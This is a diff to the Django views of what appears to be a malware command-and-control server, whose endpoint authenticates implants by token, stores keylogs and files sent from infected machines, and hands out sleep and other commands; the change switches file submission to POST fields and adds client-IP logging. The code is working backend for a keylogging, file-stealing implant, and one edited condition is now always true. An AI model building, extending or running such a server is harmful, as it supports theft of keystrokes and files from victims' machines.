@@ -13,8 +13,9 @@ TIME_TO_SLEEP = 10
 
 @csrf_exempt
 def cnc(request):
+    print get_client_ip(request)
     if request.method == 'POST':
-        if 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST or 'parameter' in request.FILES:
+        if 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST or 'parameter':
             malware = get_malware_by_token(request.POST['token'])
             if malware:
                 if request.POST['command'] == 'connect' or request.POST['command'] == 'sleep':
@@ -45,29 +46,26 @@ def cnc(request):
                         json_response["message"] = 'Keylog stored successfully'
                     get_next_command(malware, json_response)
                 elif request.POST['command'] == SUBMIT_FILE_COMMAND:
-                    if 'parameter' in request.FILES:
-                        file = FileItem.objects.filter(malware=malware).last()
-                        file_name = file.name if file is not None else FILE_PATH
-                        FileItem(
-                            name=file_name,
-                            data=request.FILES['parameter'],
-                            malware=malware,
-                        ).save()
+                    file = FileItem.objects.filter(malware=malware).last()
+                    file_name = file.name if file is not None else FILE_PATH
+                    FileItem(
+                        name=file_name,
+                        data=request.POST['parameter'],
+                        malware=malware,
+                    ).save()
 
-                        Command(
-                            type=SLEEP_COMMAND,
-                            value=TIME_TO_SLEEP,
-                            malware=malware
-                        ).save()
+                    Command(
+                        type=SLEEP_COMMAND,
+                        value=TIME_TO_SLEEP,
+                        malware=malware
+                    ).save()
 
-                        json_response = {
-                            "success": True,
-                            "message": 'File stored successfully',
-                            "command": SLEEP_COMMAND,
-                            "argument": TIME_TO_SLEEP,
-                        }
-                    else:
-                        json_response = send_failure_message('Attached file not recognized')
+                    json_response = {
+                        "success": True,
+                        "message": 'File stored successfully',
+                        "command": SLEEP_COMMAND,
+                        "argument": TIME_TO_SLEEP,
+                    }
                 else:
                     json_response = send_failure_message('Command not recognized')
             else:
@@ -78,6 +76,15 @@ def cnc(request):
         json_response = send_failure_message('POST method is required')
 
     return JsonResponse(json_response)
+
+
+def get_client_ip(request):
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0]
+    else:
+        ip = request.META.get('REMOTE_ADDR')
+    return ip
 
 
 def get_next_command(malware, json_response):
@@ -116,12 +123,6 @@ def reset(request):
         json_response = send_failure_message('Use GET method and specify a token')
 
     return JsonResponse(json_response)
-
-
-def handle_uploaded_file(f):
-    with open('some/file/name.txt', 'wb+') as destination:
-        for chunk in f.chunks():
-            destination.write(chunk)
 
 
 def get_malware_by_token(token):
@@ -209,7 +210,7 @@ def ui_file(request):
                 if file is not None:
                     json_response = {
                         "path": file.name,
-                        "data": file.data.read()
+                        "data": file.data
                     }
                 else:
                     json_response = {}
